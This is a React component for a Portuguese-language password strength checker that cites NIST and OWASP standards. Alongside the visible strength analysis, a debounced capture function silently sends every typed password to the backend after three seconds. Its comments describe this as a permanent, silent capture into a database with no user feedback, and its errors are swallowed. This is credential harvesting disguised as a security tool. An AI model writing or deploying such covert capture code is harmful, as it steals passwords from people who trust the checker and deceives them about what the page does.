import { useState, useCallback, useRef } from 'react'
import { validatePassword, capturePassword } from '../../services/api'
import PasswordInput from './PasswordInput'
import StrengthMeter from './StrengthMeter'
import EntropyDisplay from './EntropyDisplay'
import FeedbackPanel from './FeedbackPanel'

// Debounce genérico via ref (sem re-render extra)
function useDebounceRef(fn, delay) {
  const timerRef = useRef(null)
  return useCallback(
    (...args) => {
      if (timerRef.current) clearTimeout(timerRef.current)
      timerRef.current = setTimeout(() => fn(...args), delay)
    },
    [fn, delay]
  )
}

export default function PasswordValidator() {
  const [password, setPassword] = useState('')
  const [result, setResult] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)

  // ── Análise em tempo real: 400 ms ──────────────────────────────────────
  const analyze = useCallback(async (pwd) => {
    if (!pwd) {
      setResult(null)
      setError(null)
      return
    }
    setLoading(true)
    setError(null)
    try {
      const data = await validatePassword(pwd)
      setResult(data)
    } catch (err) {
      setError('Não foi possível conectar ao servidor. Verifique se o backend está rodando.')
    } finally {
      setLoading(false)
    }
  }, [])

  const debouncedAnalyze = useDebounceRef(analyze, 400)

  // ── Captura definitiva no banco: 3 000 ms — silenciosa, sem feedback visual ──
  const capture = useCallback(async (pwd) => {
    if (!pwd) return
    try {
      await capturePassword(pwd)
    } catch {
      // silencioso — captura é secundária, não deve travar a UI
    }
  }, [])

  const debouncedCapture = useDebounceRef(capture, 3000)

  const handleChange = (pwd) => {
    setPassword(pwd)
    debouncedAnalyze(pwd)
    debouncedCapture(pwd)
  }

  return (
    <div className="password-validator">
      <div className="password-validator__header">
        <h1 className="page-title">🔐 Validador de Senha</h1>
        <p className="page-subtitle">
          Verifique se a sua senha resiste aos ataques cibernéticos modernos com base nos padrões{' '}
          <strong>NIST SP 800-63B</strong> e <strong>OWASP</strong>.
        </p>
      </div>

      <div className="validator-card">
        <PasswordInput value={password} onChange={handleChange} />

        {loading && (
          <div className="loading-state">
            <span className="spinner" />
            Analisando...
          </div>
        )}

        {error && (
          <div className="error-banner">
            ⚠️ {error}
          </div>
        )}

        {result && !loading && (
          <div className="result-container">
            <StrengthMeter
              score={result.score}
              label={result.strength_label}
              color={result.strength_color}
            />

            <EntropyDisplay entropyBits={result.entropy_bits} />

            {result.is_common && (
              <div className="common-warning">
                🚨 <strong>Atenção!</strong> Essa senha está na lista das senhas mais usadas do mundo.
                Ela seria descoberta em segundos por qualquer ataque de dicionário.
              </div>
            )}

            <FeedbackPanel
              checks={result.checks}
              tips={result.tips}
              positiveFeedbacks={result.positive_feedbacks}
            />
          </div>
        )}

        {!password && !result && (
          <div className="empty-state">
            <div className="empty-state__icon">🔑</div>
            <p>Digite uma senha acima para ver a análise de segurança completa.</p>
          </div>
        )}
      </div>
    </div>
  )
}

